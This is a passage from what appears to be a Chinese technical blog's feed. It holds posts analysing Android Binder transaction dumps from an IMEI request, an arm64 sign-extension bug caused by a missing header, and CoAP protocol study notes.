class="line">6094-6105/? D/LIB_BINDER_HOOK: 54004500 00000000 1c2e0000 6e270000  T.E.........n&apos;..</span><br><span class="line">前面都一样，和上文中相同的方式存储字符串数据</span><br><span class="line">1c2e0000 这里是进程id，数据以小端存储，即2e1c，对应的10进制是11804，对应测试app的进程号</span><br><span class="line">6e270000 这里是对应的uid的16进制形式</span><br></pre></td></tr></table></figure></p><p>第二段的数据和这里比较相似，不再分析</p><p>然后是第三段数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">6094-6105/? E/LIB_BINDER_HOOK: read BR_REPLY</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: PID = 0, code = 0, dump name :  , pname size is 0, data size is 8 , target is 777fcde708  777fcde708</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 00000000 00000000                    ........</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: write BC_TRANSACTION</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: PID = 0, code = 2, dump name : @&apos;com.android.internal.app.IAppOpsService3n&apos;com.test.androidbinderhook , pname size is 70, data size is 156 , target is 777fcde810  777fcde810</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 04004001 27000000 63006f00 6d002e00  ..@.&apos;...c.o.m...</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 61006e00 64007200 6f006900 64002e00  a.n.d.r.o.i.d...</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 69006e00 74006500 72006e00 61006c00  i.n.t.e.r.n.a.l.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 2e006100 70007000 2e004900 41007000  ..a.p.p...I.A.p.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 70004f00 70007300 53006500 72007600  p.O.p.s.S.e.r.v.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 69006300 65000000 33000000 6e270000  i.c.e...3...n&apos;..</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 1a000000 63006f00 6d002e00 74006500  ....c.o.m...t.e.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 73007400 2e006100 6e006400 72006f00  s.t...a.n.d.r.o.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 69006400 62006900 6e006400 65007200  i.d.b.i.n.d.e.r.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 68006f00 6f006b00 00000000           h.o.o.k.....</span><br></pre></td></tr></table></figure></p><p>首先这里的指令为BC_TRANSACTION，phone进程作为客户端，向IAppOpsService服务发送请求数据，code为2，对应的方法信息如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;code&quot;: 2,</span><br><span class="line">  &quot;methodName&quot;: &quot;noteOperation&quot;,</span><br><span class="line">  &quot;paramTypeList&quot;: [</span><br><span class="line">    &quot;int&quot;,</span><br><span class="line">    &quot;int&quot;,</span><br><span class="line">    &quot;java.lang.String&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;,</span><br><span class="line">它的声明信息为</span><br><span class="line">public int noteOperation(int code, int uid, String packageName)</span><br></pre></td></tr></table></figure></p><p>查阅了相关资料，发现它是给用户设置权限的方法，接下来来看报文信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 04004001 27000000 63006f00 6d002e00  ..@.&apos;...c.o.m...</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 61006e00 64007200 6f006900 64002e00  a.n.d.r.o.i.d...</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 69006e00 74006500 72006e00 61006c00  i.n.t.e.r.n.a.l.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 2e006100 70007000 2e004900 41007000  ..a.p.p...I.A.p.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 70004f00 70007300 53006500 72007600  p.O.p.s.S.e.r.v.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 69006300 65000000 33000000 6e270000  i.c.e...3...n&apos;..</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 1a000000 63006f00 6d002e00 74006500  ....c.o.m...t.e.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 73007400 2e006100 6e006400 72006f00  s.t...a.n.d.r.o.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 69006400 62006900 6e006400 65007200  i.d.b.i.n.d.e.r.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 68006f00 6f006b00 00000000           h.o.o.k.....</span><br><span class="line"></span><br><span class="line">前面相同的部分这里不再解析了</span><br><span class="line">33000000 10进制为51，这里是对应的操作码，它的对应信息可以从这里查看http://androidxref.com/7.1.2_r36/xref/frameworks/base/core/java/android/app/AppOpsManager.java   可以看到51为OP_READ_PHONE_STATE，即为读取手机状态的权限</span><br><span class="line">6e270000 这里上文中也提到了，是测试app的uid</span><br></pre></td></tr></table></figure></p><p>接着我们继续下一段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">6094-6105/? E/LIB_BINDER_HOOK: write BC_REPLY</span><br><span class="line">6094-6105/? E/LIB_BINDER_HOOK: PID = 0, code = 0, dump name : 354360070189667 , pname size is 15, data size is 40 , target is 777fcde810  777fcde810</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 00000000 0f000000 33003500 34003300  ........3.5.4.3.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 36003000 30003700 30003100 38003900  6.0.0.7.0.1.8.9.</span><br><span class="line">6094-6105/? D/LIB_BINDER_HOOK: 36003600 37000000                    6.6.7...</span><br></pre></td></tr></table></figure></p><p>这里的消息就比较简单了，就是将imei的数据写入binder驱动，至此整个binder请求数据的过程就结束了，补充一下，为什么这里获取到的结果，最前面是00000000呢，这里可以看一下parcel.java的源码<a href="http://androidxref.com/7.1.2_r36/xref/frameworks/base/core/java/android/os/Parcel.java" target="_blank" rel="noopener">http://androidxref.com/7.1.2_r36/xref/frameworks/base/core/java/android/os/Parcel.java</a>  其中提到了string 类型的表示，即为0，而0f即为后续字符串的长度，15.</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>从binder数据角度来看获取imei的整个过程，大致上分为以下几步:</p><ul><li>发出请求</li><li>检查权限</li><li>授予权限</li><li>返回数据</li></ul><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><ul><li><a href="http://gityuan.com/2015/11/01/binder-driver/" target="_blank" rel="noopener">http://gityuan.com/2015/11/01/binder-driver/</a></li><li><a href="https://paul.pub/android-binder-driver/" target="_blank" rel="noopener">https://paul.pub/android-binder-driver/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Binder-数据分析&quot;&gt;&lt;a href=&quot;#Binder-数据分析&quot; class=&quot;headerlink&quot; title=&quot;Binder 数据分析&quot;&gt;&lt;/a&gt;Binder 数据分析&lt;/h1&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;前一阵弄了一个和binder有关的小工具 &lt;a href=&quot;https://github.com/EggUncle/Hermes&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/EggUncle/Hermes&lt;/a&gt; ，大概就是通过对ioctl进行hook，读取到binder的数据信息。&lt;/p&gt;
&lt;p&gt;binder的具体原理等细节这里就不讨论了，我们此处仅仅从数据的角度来分析一下获取手机imei时，binder的请求和响应过程。&lt;br&gt;&lt;br&gt;操作环境: Nexus5x aosp 7.1.2&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Android Binder hook" scheme="http://yoursite.com/tags/Android-Binder-hook/"/>
    
  </entry>
  
  <entry>
    <title>一个include引起的惨案</title>
    <link href="http://yoursite.com/2019/03/26/%E4%B8%80%E4%B8%AAinclude%E5%BC%95%E8%B5%B7%E7%9A%84%E6%83%A8%E6%A1%88/"/>
    <id>http://yoursite.com/2019/03/26/%E4%B8%80%E4%B8%AAinclude%E5%BC%95%E8%B5%B7%E7%9A%84%E6%83%A8%E6%A1%88/</id>
    <published>2019-03-26T14:58:20.000Z</published>
    <updated>2020-07-28T14:11:03.598Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>emmmmm 前一段时间部门转iot了,然后就开始做相关的东西了,写了一些c语言的东西,踩到一个一开始觉得有点玄学的坑.在arm64的平台上遇到了一个比较奇怪的bug.</p><a id="more"></a><h1 id="0x01-起因"><a href="#0x01-起因" class="headerlink" title="0x01 起因"></a>0x01 起因</h1><p>我的代码中有大概这样一个操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct test *t = my_malloc(sizeof(struct test));</span><br></pre></td></tr></table></figure></p><p>my_malloc大概是malloc一个封装,代码大致是这样,它属于my_stdlib.h<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">void* my_malloc(param)&#123;</span><br><span class="line">  return malloc(param);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后就碰上一个有些奇怪的问题,调用my_malloc以后,返回的地址,访问时会报段错误,而实际查看它的内存信息的时候,像是被覆盖了.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">实际malloc返回的地址</span><br><span class="line">7f968511e0</span><br><span class="line"></span><br><span class="line">而my_malloc返回后的地址变成了这样</span><br><span class="line">ffffffff968511e0</span><br></pre></td></tr></table></figure></p><p>大致情况看起来就是,前四个字节,像是被什么不知名的东西,覆盖掉了.</p><h1 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h1><p>起初确实是觉得是代码逻辑有什么问题,导致了溢出之类的,覆盖了这一部分的返回值,而后发现斌没有,在尝试使用gdb的单步调试的时候发现了更加奇怪的情况.</p><p>在bl跳转调用my_malloc后,其中bl跳转调用真正的malloc,以及最后my_malloc返回前,我都查看了x0寄存器的值,发现都没有问题,而后在my_malloc返回,走到外部调用它的函数的时候,返回值像是突然发生了变化,停在调用bl my_malloc之后时,查看x0寄存器,它的值仍然是正常了,尝试使用gdb修改pc指针,跳过bl后的语句,结果发现,返回给外部函数的值就正常了.</p><p>造成异常的语句,是一条汇编代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sxtwx0, w0</span><br></pre></td></tr></table></figure></p><p>它的作用是将w0的值进行符号扩展,再赋值给x0寄存器,w0为x0的低32位,sxtw的作用大致是在扩展为64位时,将原先符号位前面的数据填满左边,而零填满右边的数据.(我目前汇编这个不是太好,这里可能没有很透彻的理解这条汇编,具体可以看这里<a href="https://developer.arm.com/docs/100898/latest/data-processing-instructions" target="_blank" rel="noopener">https://developer.arm.com/docs/100898/latest/data-processing-instructions</a>)</p><p>这里大概分析一下这条语句在目前这个场景下实际执行的情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">首先x0原先的值,在调用完my_malloc的之后,变成了</span><br><span class="line"></span><br><span class="line">高32位    低32位</span><br><span class="line">0000007f 968511e0</span><br><span class="line"></span><br><span class="line">而w0此时的值,即为x0的底32位</span><br><span class="line">968511e0</span><br><span class="line"></span><br><span class="line">sxtw将w0的符号位扩展,填满前32位,所以结果变成了这样</span><br><span class="line"></span><br><span class="line">高32位    低32位</span><br><span class="line">ffffffff 968511e0</span><br></pre></td></tr></table></figure></p><p>到这里,就已经分析出来了报错的原因,即为多出来的这一条sxtw语句,导致了返回值变为了一个奇怪的值,不可访问,而后导致段错误,但是真正问题是,为什么会多出一条sxtw语句导致这样的问题.</p><h1 id="0x03-原因"><a href="#0x03-原因" class="headerlink" title="0x03 原因"></a>0x03 原因</h1><p>找了一堆资料,最后发现..出现这个情况的原因,比较沙雕. 我找到一份ppt,其中稍微提到了一个这样的情况.<br><img src="https://github.com/EggUncle/Demo/blob/master/markdownimg/2019-03-26%2022-33-21%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png?raw=true" alt=""></p><p><img src="https://github.com/EggUncle/Demo/blob/master/markdownimg/2019-03-26%2022-33-30%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png?raw=true" alt=""></p><p>这里大概解释一下,就是当没有函数原型的时候,编译出来的返回值的类型会是int,也就是四个字节,也就是底32位,当它存在一个64的寄存器的时候,可能就需要进行符号扩展的操作,也就是使用功能类似sxtw的语句,导致了我上面提到的那个问题,而后引入了my_stdlib.h,就没有这个问题了.</p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>总结就是,以后写代码还是得多注意编译器警告.这个玩意在编译的时候其实有警告信息的,我当时看到编译通过了就没仔细看,今天和同事聊了一下这个事情,我们决定在编译期间,把警告直接当作报错停止编译过程了.不过讲道理我以前连gdb都不怎么会用,经过这一波应该也算是会点新东西了,嗨呀我好菜啊.</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;emmmmm 前一段时间部门转iot了,然后就开始做相关的东西了,写了一些c语言的东西,踩到一个一开始觉得有点玄学的坑.在arm64的平台上遇到了一个比较奇怪的bug.&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>coap协议学习笔记 块传输</title>
    <link href="http://yoursite.com/2019/02/21/coap%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9D%97%E4%BC%A0%E8%BE%93/"/>
    <id>http://yoursite.com/2019/02/21/coap%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9D%97%E4%BC%A0%E8%BE%93/</id>
    <published>2019-02-21T15:05:02.000Z</published>
    <updated>2020-07-28T14:10:23.495Z</updated>
    
    <content type="html"><![CDATA[<p>啊不知道昨天那个咋整的，显示代码块的地方好像不大对劲。。。</p><p>今天差不多把块传输的这部分看完了，也大概记了一点</p><a id="more"></a><h1 id="coap-块传输"><a href="#coap-块传输" class="headerlink" title="coap 块传输"></a>coap 块传输</h1><p>块传输新增了几个option<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+--------+--------+-----------+</span><br><span class="line">| Number | Name   | Reference |</span><br><span class="line">+--------+--------+-----------+</span><br><span class="line">| 23     | Block2 | RFC 7959  |</span><br><span class="line">|        |        |           |</span><br><span class="line">| 27     | Block1 | RFC 7959  |</span><br><span class="line">|        |        |           |</span><br><span class="line">| 28     | Size2  | RFC 7959  |</span><br><span class="line">+--------+--------+-----------+</span><br><span class="line"></span><br><span class="line"> Table 3: CoAP Option Numbers</span><br></pre></td></tr></table></figure></p><p>size1在rfc7252中定义</p><h2 id="为何引入块传输"><a href="#为何引入块传输" class="headerlink" title="为何引入块传输"></a>为何引入块传输</h2><ul><li>coap基于udp,最大传输数据报长度为64kb</li><li>避免数据报文分片(基于IP)</li><li>避免适配层分片(基于RFC4919 6LoWPAN)</li></ul><h2 id="Block-Option格式"><a href="#Block-Option格式" class="headerlink" title="Block Option格式"></a>Block Option格式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">0 1 2 3 4 5 6 7</span><br><span class="line">+-+-+-+-+-+-+-+-+</span><br><span class="line">|  NUM  |M| SZX |</span><br><span class="line">+-+-+-+-+-+-+-+-+</span><br><span class="line"></span><br><span class="line">0                   1</span><br><span class="line">0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|          NUM          |M| SZX |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line"></span><br><span class="line">0                   1                   2</span><br><span class="line">0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                   NUM                 |M| SZX |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line"></span><br><span class="line">            Figure 1: Block Option Value</span><br></pre></td></tr></table></figure><p>Option Value为变长0~33个字节的无符号数<br>NUM: 给定大小的块的序号,从0开始<br>M: 是否有更多块<br>SZX: 块大小,取值范围为0~6,实际代表的payload大小为2^(4+SZX),即16~1024Byte</p><h2 id="Block-Option语义"><a href="#Block-Option语义" class="headerlink" title="Block Option语义"></a>Block Option语义</h2><p>Block1 和 Block2 都可以出现在Request和response中,但是含义不同</p><ul><li>Block1 出现在Request和Block2出现在response中时,代表正在执行块传输,描述了正在传输的payload在整个body的哪个部分,这里称为描述性用法</li><li>它们出现在相反的地方时,则提供了如何形成或者处理有效载荷的附加控制,这里称为控制性用法</li></ul><p>这里再额外写一下自己关于这两个用法粗略的理解</p><ol><li>当在进行块传输时,block option用来描述正在传输的块的信息,这种叫做描述性用法</li><li>当需要修改或者建议块传输的大小,请求传输块等情况时,block option用来指示期望的块的大小或者序号等,这种叫做控制性用法</li></ol><h3 id="描述性用法"><a href="#描述性用法" class="headerlink" title="描述性用法"></a>描述性用法</h3><p>Block1出现在Request和Block2出现在response中时.option value的取值含义如下</p><ul><li>NUM: 表示当前Message的Payload在整个body中的编号</li><li>M: 表示是否还有更多块才能完成整个body的传输</li><li>SZX: 当M为1时,表示当前payload的大小2^(SZX+4),当M为0时,表示大小范围是1~2^(SZX+4)</li></ul><h3 id="控制性用法"><a href="#控制性用法" class="headerlink" title="控制性用法"></a>控制性用法</h3><h4 id="Block2"><a href="#Block2" class="headerlink" title="Block2"></a>Block2</h4><p>当Block2出现在Rquest中时,属于控制性用法:</p><ul><li>NUM: 期望response传输的块号</li><li>M: 无意义,设置为0</li><li>SZX: 当NUM为0时,表示希望采用的块的大小,当NUM不为0时,直接采用上一个接收到的Response中的大小</li></ul><p>这里举两个例子<br><img src="https://wkretype.bdimg.com/retype/zoom/bf97fd1eeff9aef8941e06bd?pn=16&amp;o=jpg_6&amp;md5sum=c8725b0b48a9c0630c89996d5dc6e6dd&amp;sign=ba8d40d735&amp;png=85562-121761&amp;jpg=1695092-1824857" alt=""></p><p>如果request中block2期望的值很大,response可能会返回小一些的值,并且下一个request中的szx必须调整为这个.</p><p><img src="https://wkretype.bdimg.com/retype/zoom/bf97fd1eeff9aef8941e06bd?pn=15&amp;o=jpg_6&amp;md5sum=c8725b0b48a9c0630c89996d5dc6e6dd&amp;sign=ba8d40d735&amp;png=58885-85561&amp;jpg=1548744-1695091" alt=""></p><h4 id="Block1"><a href="#Block1" class="headerlink" title="Block1"></a>Block1</h4><p>当Block1出现在response中,属于控制性用法</p><ul><li>NUM: 表示正在确认的块号</li><li>M: 如果Request中的Block1的M为1,server可以选择是否对每个块执行单独的操作或者是以原子方式处理整个主题请求,或者混合.</li></ul><p>如果response中M置1,不是对这个request最终的response,表明server希望收集body后原子的执行request</p><p>如果response中M置0,标明该request已经执行,并且这个response是最终的response(即使之前request中的M为1的情况)</p><ul><li>SZX: 标明server期望接收的块的最大值,可能是初始交换的SZX值,也可能是server指定的更小的值,client需要使用该值进行后续的block的传输(这里有个注意事项,详见[实现注意事项1]</li></ul><h2 id="Size1-和-Size2-Option"><a href="#Size1-和-Size2-Option" class="headerlink" title="Size1 和 Size2 Option"></a>Size1 和 Size2 Option</h2><p> 块传输时,了解整个body的大小,是有一定优势的,因此定义了size1和size2 option</p><ul><li>Size1 option: 用于指示通过request传输的representation的大小</li><li>Size2 option: 用于指示通过response传输的representation的大小</li></ul><h2 id="新增的response-code"><a href="#新增的response-code" class="headerlink" title="新增的response code"></a>新增的response code</h2><p>新增了两个response code,并扩展了一个原coap规范中response code的使用场景</p><ul><li>2.31 Continue</li><li>4.08 Request Entity Incomplete</li><li>4.13 Request Entity Too Large</li></ul><h2 id="实现注意事项"><a href="#实现注意事项" class="headerlink" title="实现注意事项"></a>实现注意事项</h2><ol><li>当client请求块大小时,如果server不满于当前块的大小,但是仍然处理了这个包,后续的包的大小和num,需要安装服务器给的块大小重新进行计算.<br>例如第一个请求包为0/1/128,但是这里服务器返回0/1/32,则client继续传输数据的时候就是4/1/32,因为128/32=4,索引从0开始,这里可以理解为已经传了前四个包了.所以新的块传输请求num从4开始</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://tools.ietf.org/html/rfc7959" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc7959</a></li><li><a href="https://wenku.baidu.com/view/1d210d711611cc7931b765ce050876323112746e.html?re=view" target="_blank" rel="noopener">https://wenku.baidu.com/view/1d210d711611cc7931b765ce050876323112746e.html?re=view</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;啊不知道昨天那个咋整的，显示代码块的地方好像不大对劲。。。&lt;/p&gt;
&lt;p&gt;今天差不多把块传输的这部分看完了，也大概记了一点&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>coap协议学习笔记</title>
    <link href="http://yoursite.com/2019/02/20/coap%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2019/02/20/coap%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2019-02-20T14:24:46.000Z</published>
    <updated>2020-07-28T14:10:30.929Z</updated>
    
    <content type="html"><![CDATA[<h1 id="coap-协议"><a href="#coap-协议" class="headerlink" title="coap 协议"></a>coap 协议</h1><p>最近需要弄着个，就稍微简单的过了一遍整个coap，蛮多其实都没记住的，先写这些吧，可能会有后续。</p><a id="more"></a><h2 id="消息类型"><a href="#消息类型" class="headerlink" title="消息类型"></a>消息类型</h2><ol><li>需要确认消息   CON 0</li><li>不需要确认消息  NON 1（适用于消息会重复频繁的发送，丢掉消息不对业务产生影响）</li><li>确认应答消息   ACK 2</li><li>复位消息  RST 3 (拒绝响应可以使用这个类型的消息)</li></ol><h4 id="可靠消息传输"><a href="#可靠消息传输" class="headerlink" title="可靠消息传输"></a>可靠消息传输</h4><p>主要是通过确认及重传机制来实现的，客户端发送消息后，需要等待服务器收到通知， 如果在规定时间内，没有收到需要重新发送数据。 可靠传输是基于CON消息传输的，服务器端收到CON类型的消息后，需要返回ACK消息，客户端到在指定时间ACK_TIMEOUT内收到ACK消息后，才代表这个消息以可靠到服务器端。</p><h4 id="不可靠消息传输"><a href="#不可靠消息传输" class="headerlink" title="不可靠消息传输"></a>不可靠消息传输</h4><p>客户端只管发送消息， 不管服务器端有没有收到，因此可能存在丢包。不可靠传输是基于NON消息传输的。服务器端收到NON类型的消息后，不用回复ACK消息。</p><h2 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h2><ol><li>GET  </li><li>PUT  </li><li>POST  </li><li>DELETE<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+-----------+                       </span><br><span class="line">| Code | Name   | Reference |                        </span><br><span class="line">+------+--------+-----------+                        </span><br><span class="line">| 0.01 | GET    | [RFC7252] |                        </span><br><span class="line">| 0.02 | POST   | [RFC7252] |                        </span><br><span class="line">| 0.03 | PUT    | [RFC7252] |                        </span><br><span class="line">| 0.04 | DELETE | [RFC7252] |                        </span><br><span class="line">+------+--------+-----------+  </span><br><span class="line"> 表 5: CoAP Method Codes</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">## 响应类型</span><br><span class="line">1. Success 2.xx 代表客户端请求被成功接收并被成功处理</span><br><span class="line">2. Client Error 4.xx 代表客户端请求有错误，比如参数错误等</span><br><span class="line">3. Server Error 5.xx 代表服务器在执行客户端请求时出错。</span><br><span class="line"></span><br><span class="line">所有的请求服务器响应可以放在CoAP CON/NON/ACK消息里面进行传输。针对CoAP 带CON消息请求，响应如果快速处理完（有些请求的处理需要耗时多，服务器无法立即响应），则可直接放在ACK消息包里面返回。对于无法立即响应的，服务器带资源ready后，会单独发一个响应消息包给客户端</span><br><span class="line"></span><br><span class="line">8-bit无符号整型。拆分为3-bit的分类信息和5-bit详细信息。</span><br><span class="line">写作”c.dd”。c是3-bit长，可以是一个从0到7的数字，dd是5-bit长，它一个两位的数字，从00到31。</span><br><span class="line">分类信息c可以代表是一个请求（0），一个成功的响应（2），一个客户端错误响应（4），或者一个服务端错误响应（5）。</span><br><span class="line"></span><br><span class="line">## 消息报文</span><br><span class="line">![](https://www.adminiot.com.cn/static/index/img/meta/coap/format.png)</span><br><span class="line"></span><br><span class="line">这里找一个实际的报文解析一下看看,首先使用这个库https://github.com/obgm/libcoap</span><br><span class="line">安装完之后,打开example,不打开服务端,下载网络调试助手,然后连接127.0.0.1 5683(coap默认端口),使用libcoap的demo中的client</span><br></pre></td></tr></table></figure></li></ol><p>./coap-client -m get -o result.txt coap://localhost<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行后显示</span><br></pre></td></tr></table></figure></p><p>v:1 t:0 tkl:0 c:1 id:27940<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">即版本号为1,类型为0,即CON,token长度为0,code为1,即GET,message id为27940</span><br><span class="line"></span><br><span class="line">它的二进制数据如下(为方便展示这里使用十六进制)</span><br></pre></td></tr></table></figure></p><p>40 01 6d 24 39 6c 6f 63 61 6c 68 6f 73 74<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将其转换为2进制并按照报文格式划分</span><br></pre></td></tr></table></figure></p><p>ver: 01<br>type: 00<br>tkl: 0000<br>code: 00000001<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code的展现形式为c.dd 其中c为三位,dd为后五位,这里的code为0.01</span><br></pre></td></tr></table></figure></p><p>+——+——–+———–+<br>| Code | Name   | Reference |<br>+——+——–+———–+<br>| 0.01 | GET    | [RFC7252] |<br>| 0.02 | POST   | [RFC7252] |<br>| 0.03 | PUT    | 